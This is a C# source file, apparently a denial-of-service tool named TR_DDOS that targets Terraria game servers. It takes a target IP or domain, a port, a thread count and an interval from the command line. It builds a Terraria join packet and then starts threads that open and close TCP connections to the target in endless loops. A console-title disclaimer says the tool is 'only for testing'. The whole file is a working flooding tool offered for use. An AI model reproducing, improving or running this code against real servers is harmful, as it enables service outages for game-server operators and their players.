using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;

namespace TR_DDOS
{
	class Program
	{
		static string server;
		static int port, interval;
		static byte[] GetBufferJoin()
		{
			byte[] buffer = new byte[131070];
			MemoryStream ms = new MemoryStream(buffer);
			BinaryWriter bw = new BinaryWriter(ms);
			bw.BaseStream.Position = 2L;
			bw.Write(1);
			/*for (int i = 0; i < 20480; i++)
			{
				bw.Write((byte)new Random().Next());
			}*/
			bw.Write("Terraria194");
			int size = (int)bw.BaseStream.Position;
			bw.BaseStream.Position = 0;
			bw.Write((short)size);
			bw.BaseStream.Position = size;
			byte[] rst = new byte[bw.BaseStream.Position];
			for (int i = 0; i < rst.Length; i++)
			{
				rst[i] = buffer[i];
			}
			bw.Close();
			ms.Close();
			return buffer;
		}

		static void Main(string[] args)
		{
			Console.Title = "作者:Qiu    这款工具仅用于测试，作者不承担用户造成的任何后果";
			Console.WriteLine("Mode:\t" + (args[0] == "ip" ? "IP" : "Domain"));
			Console.WriteLine("Target:\t" + args[1]);
			Console.WriteLine("Port:\t" + args[2]);
			Console.WriteLine("Thread:\t" + args[3]);
			Console.WriteLine("Interval:\t" + args[4]);

			server = args[1];
			port = Convert.ToInt32(args[2]);
			interval = Convert.ToInt32(args[4]);
			if (!(args[0] == "ip"))
			{
				server = Dns.GetHostEntry(server).AddressList[0].ToString();
			}
			
			byte[] bufferJoin = GetBufferJoin();


			
			for (int i = 0; i < Convert.ToInt32(args[3]); i++)
			{
				new System.Threading.Thread(() =>
				{
					while (true)
					{
						Console.Write(".");
						try
						{
							bufferJoin[5] = (byte)new Random().Next();
							ISocket socket = new TcpSocket();
							socket.Connect(new TcpAddress(System.Net.IPAddress.Parse(server), port));
							socket.Close();
							System.Threading.Thread.Sleep(interval);
						}
						catch (Exception e)
						{
						}
					}
				}).Start();
			}
		}
	}
}
